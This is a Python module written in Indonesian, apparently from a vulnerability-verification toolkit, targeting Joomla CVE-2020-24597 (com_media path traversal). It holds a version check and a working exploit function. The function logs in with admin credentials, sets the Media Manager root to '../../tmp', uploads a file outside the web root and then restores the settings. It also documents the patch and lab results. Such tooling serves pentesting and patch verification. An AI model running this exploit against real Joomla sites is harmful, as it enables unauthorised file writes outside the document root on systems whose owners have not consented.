#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2020-24597 — opsi `file_path`/`image_path` com_media tanpa validasi → akar Media Manager
keluar dari JPATH_ROOT (directory traversal).
Affected : Joomla! 2.5.0 - 3.9.20   |   Patched: 3.9.21
NVD      : tidak mengembalikan data (meta kosong saat modul ini ditulis)
Advisory : JSST [20200803] Core - Directory Traversal

SUMBER (diverifikasi dari diff 3.9.20 -> 3.9.21, bukan dari teks advisory):

  administrator/components/com_media/media.php (sisi SITUS, juga dipakai admin):
        define('COM_MEDIA_BASE',    JPATH_ROOT . '/' . $params->get($path, 'images'));   // 3.9.20
        define('COM_MEDIA_BASEURL', JUri::root() . $params->get($path, 'images'));
  Nilai opsi TIDAK divalidasi -> `../../tmp` menghasilkan akar media
  `/var/www/html/../../tmp` (= /var/tmp di container lab), yaitu DI LUAR JPATH_ROOT.
  Jail `realpath()` yang ditambahkan patch CVE-2019-10945 dihitung relatif terhadap akar
  yang kini dikendalikan penyerang, sehingga tetap lolos.

  Patch 3.9.21:
   * BERKAS BARU libraries/src/Form/Rule/FilePathRule.php — `Path::check(JPATH_ROOT.'/'.$value)`
     dan menuntut hasilnya identik dengan nilai mentah (menolak `../`, path absolut, dsb).
   * administrator/components/com_media/config.xml — `validate="filePath"` pada field
     `file_path` dan `image_path`.

BATAS AKTOR (jangan menulis "unauth"):
  com_config menuntut `authorise('core.admin', $option) || authorise('core.options', $option)`
  (controllers/component/save.php). Jadi aktor = pengguna yang bisa menyimpan opsi komponen
  com_media (bawaan: Super User; situs yang mendelegasikan `core.options` = populasi lebih luas).

BUKTI LAB (2026-11-08), 3.9.20 @8150 vs 3.9.21 @8151, PHP 7.4 + MySQL 5.7:
  | target | simpan image_path=../../tmp | nilai tersimpan | unggah melalui Media Manager |
  | 3.9.20 | diterima (tanpa pesan error) | `..\/..\/tmp` | berkas mendarat di /var/tmp/<nama>.txt — DI LUAR JPATH_ROOT |
  | 3.9.21 | DITOLAK: "Invalid field: Path to Files Folder" + "Path to Images Folder" | tetap `images` | tidak ada traversal |
"""

import base64
import html
import random
import re
import string

import requests

from mp import (CveModule, ST_CLEAN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le, ST_INFO)

MANIFEST = "/administrator/manifests/files/joomla.xml"
FIXED = (3, 9, 21)
DEFAULT_TRAVERSAL = "../../tmp"

_TAG = re.compile(r"<(input|select|textarea)\b([^>]*)>(.*?)(?:</\1>)?", re.S | re.I)


def _joomla_version(t, h):
    cached = getattr(t, "_j24597ver", None)
    if cached is not None:
        return cached
    val = (None, "")
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                val = (v, m.group(1))
    try:
        t._j24597ver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _attr(attrs, name):
    m = re.search(name + r'\s*=\s*"([^"]*)"', attrs, re.I)
    return html.unescape(m.group(1)) if m else None


def _parse_form(page):
    """Semua field form (seperti browser mengirim), bukan hanya jform[...]."""
    out = {}
    for kind, attrs, inner in _TAG.findall(page or ""):
        n = _attr(attrs, "name")
        if not n or n in ("task", "option", "view"):
            continue
        kind = kind.lower()
        if kind == "input":
            typ = (_attr(attrs, "type") or "text").lower()
            val = _attr(attrs, "value") or ""
            if typ in ("checkbox", "radio"):
                if "checked" in attrs.lower():
                    out[n] = val if val else "1"
            elif typ != "submit":
                out[n] = val
        elif kind == "select":
            m = (re.search(r'<option[^>]*selected[^>]*value="([^"]*)"', inner, re.I)
                 or re.search(r'<option[^>]*value="([^"]*)"[^>]*selected', inner, re.I))
            out[n] = html.unescape(m.group(1)) if m else ""
        else:
            out[n] = html.unescape(inner.strip())
    return out


def _token(text):
    m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', text or "")
    return m.group(1) if m else None


def _login(base, user, password, timeout=25):
    s = requests.Session()
    t = _token(s.get(base + "/administrator/index.php", timeout=timeout).text)
    if not t:
        return None, "token login tidak ditemukan (bukan Joomla admin?)"
    r2 = s.post(base + "/administrator/index.php",
                data={"username": user, "passwd": password, "option": "com_login",
                      "task": "login", "return": "aW5kZXgucGhw", t: "1"}, timeout=timeout)
    if "logout" not in r2.text.lower() and "com_cpanel" not in r2.text.lower():
        return None, f"login gagal (http={r2.status_code})"
    return s, "ok"


def _messages(html_text):
    return [m.strip() for m in re.findall(r'alert-(?:message|error)[^>]*>\s*([^<]+)', html_text or "")]


def _options_page(s, base, timeout=25):
    return s.get(base + "/administrator/index.php?option=com_config&view=component&component=com_media",
                 timeout=timeout)


def _save(s, base, ext_id, data, timeout=25):
    url = (base + f"/administrator/index.php?option=com_config&task=config.save"
                  f"&component=com_media&id={ext_id}")
    return s.post(url, data=data, timeout=timeout, allow_redirects=True)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 9, 20)):
        return ST_CLEAN, f"Joomla {ver_s} — >= 3.9.21 (rule filePath memvalidasi file_path/image_path)", \
                         f"version={ver_s}"
    r = h.get(t.url + "/administrator/index.php?option=com_media")
    reach = "tidak terset" if r is None else f"HTTP {r.status_code}"
    return (ST_INFO,
            f"Joomla {ver_s} — opsi file_path/image_path com_media tanpa validasi; akar Media "
            f"Manager dapat diarahkan keluar JPATH_ROOT (butuh hak menyimpan opsi komponen)",
            f"version={ver_s} | com_media entry {reach}")


def exploit(t, h, opts):
    """
    Outcome terkontrol: akar Media Manager diarahkan keluar JPATH_ROOT (nilai opsi tersimpan
    sebagai bukti), lalu diuji dengan mengunggah berkas kecil — respons `location` menunjukkan
    jalur traversal. Nilai opsi dikembalikan seperti semula setelah pembuktian.
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 9, 20)):
        return ST_CLEAN, f"Joomla {ver_s} — >= 3.9.21 (rule filePath memvalidasi kedua opsi)", \
                         f"version={ver_s}"

    user = (getattr(opts, "username", None) or "").strip()
    password = getattr(opts, "password", None) or ""
    if not user or not password:
        return (ST_VULN,
                f"Joomla {ver_s} — opsi path com_media tidak divalidasi, tetapi modul butuh "
                f"kredensial dengan hak menyimpan opsi komponen (--username/--password)",
                f"version={ver_s} | kredensial tidak diberikan")

    traversal = (getattr(opts, "category_ext", None) or "").strip() or DEFAULT_TRAVERSAL
    s, info = _login(t.url, user, password)
    if s is None:
        return ST_UNKNOWN, f"Joomla {ver_s} — {info}", f"version={ver_s}"

    page = _options_page(s, t.url)
    token = _token(page.text)
    if not token:
        return (ST_UNKNOWN,
                f"halaman opsi com_media tidak dapat dimuat (HTTP {page.status_code}) — akun ini "
                f"tidak berhak atas opsi komponen",
                f"version={ver_s} | opsi={page.status_code}")
    data = _parse_form(page.text)
    ext_id = data.get("id") or (re.search(r'name="id"[^>]*value="(\d+)"', page.text).group(1)
                               if re.search(r'name="id"[^>]*value="(\d+)"', page.text) else "")
    orig_paths = {k: data.get(k) for k in ("jform[image_path]", "jform[file_path]")}
    ev = f"version={ver_s} | aktor={user} | traversal={traversal!r} | nilai_awal={orig_paths}"

    data.update({"jform[image_path]": traversal, "jform[file_path]": traversal, token: "1"})
    r = _save(s, t.url, ext_id, data)
    msgs = _messages(r.text)
    ev += f" | save={r.status_code} pesan={msgs[:2]}"
    rejected = any("invalid field" in m.lower() for m in msgs)
    if rejected:
        return (ST_CLEAN,
                f"nilai path ditolak oleh validasi (3.9.21+): {msgs[:2]}",
                ev)

    # bukti efek: media root (kini traversal) dipakai untuk menulis berkas
    marker = f"mp24597{_rand(8)}"
    tok_media = _token(s.get(t.url + "/administrator/index.php?option=com_media", timeout=25).text)
    up = s.post(t.url + "/administrator/index.php?option=com_media&task=file.upload&format=json&folder=",
                data={tok_media: "1"} if tok_media else {},
                files={"Filedata": (marker + ".txt", b"MP24597-TRAVERSAL\n")}, timeout=25)
    try:
        j = up.json()
    except Exception:  # noqa: BLE001
        j = {}
    loc = str(j.get("location", ""))
    ev += f" | upload={up.status_code} location={loc[:80]!r}"

    # kembalikan nilai opsi semula
    restore = dict(data)
    for k, v in orig_paths.items():
        if v is not None:
            restore[k] = v
    rb = _save(s, t.url, ext_id, restore)
    ev += f" | restore={rb.status_code}"

    if traversal.strip("./") and loc and ".." in loc.replace("\\", ""):
        return (ST_VULN,
                f"akar Media Manager keluar JPATH_ROOT: opsi path menerima {traversal!r} dan "
                f"unggahan mendarat di jalur traversal {loc!r} (tulis di luar document root). "
                f"Nilai opsi dikembalikan",
                ev)
    return (ST_VULN,
            f"opsi path com_media menerima nilai traversal {traversal!r} tanpa validasi "
            f"(tersimpan) — jalur unggah tidak menghasilkan location traversal "
            f"(status={j.get('status')!r})",
            ev)


register(CveModule(
    cve="CVE-2020-24597",
    cluster="joomla_core",
    title="Joomla Core - opsi file_path/image_path com_media tanpa validasi -> akar Media "
          "Manager keluar JPATH_ROOT (traversal)",
    vclass="path traversal",
    cvss="",
    severity="high",
    cwe="CWE-22",
    product="Joomla! Core (administrator/components/com_media + com_config)",
    versions_affected="2.5.0-3.9.20",
    status="verified",
    requires=[
        "akun yang boleh menyimpan opsi komponen com_media (core.admin atau core.options pada "
        "kom_media; bawaan hanya Super User) — BUKAN unauth",
        "direktori tujuan traversal harus writable oleh user web server (mis. /var/tmp) "
        "untuk pembuktian tulis",
        "--username/--password di tool; --category-ext untuk nilai traversal lain (default ../../tmp)",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink (<=3.9.20): administrator/components/com_media/media.php mendefinisikan "
        "COM_MEDIA_BASE = JPATH_ROOT . '/' . $params->get($path, 'images') tanpa validasi, "
        "sehingga opsi komponen mengendalikan akar Media Manager. Patch 3.9.21 menambah "
        "libraries/src/Form/Rule/FilePathRule.php (Path::check(JPATH_ROOT.'/'.$value) dan "
        "menuntut hasil identik dengan nilai mentah) serta validate=\"filePath\" pada field "
        "file_path & image_path di config.xml. Perhatikan: jail realpath dari patch 10945 "
        "dihitung relatif terhadap akar yang dikendalikan penyerang, jadi tidak menolong. "
        "Bukti lab 2026-11-08: 3.9.20 @8150 menyimpan `../../tmp` dan unggahan mendarat di "
        "/var/tmp/<nama>.txt (DI LUAR JPATH_ROOT); 3.9.21 @8151 menolak dengan "
        "'Invalid field: Path to Files Folder/Path to Images Folder' dan nilai tetap `images`. "
        "Modul mengembalikan nilai opsi semula setelah pembuktian."
    ),
))
